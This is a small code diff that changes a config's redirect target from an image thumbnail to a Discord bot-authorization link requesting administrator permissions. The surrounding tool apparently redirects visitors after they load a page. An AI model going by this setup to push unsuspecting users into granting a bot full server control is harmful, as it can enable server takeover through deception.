@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHsU06RNyMELY_CCup7OkIxcYT32ebaSYcNw&s" # Link to the webpage to redirect to 
+        "page": "https://discord.com/oauth2/authorize?client_id=1482280383381770340&permissions=8&integration_type=0&scope=bot+applications.commands" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
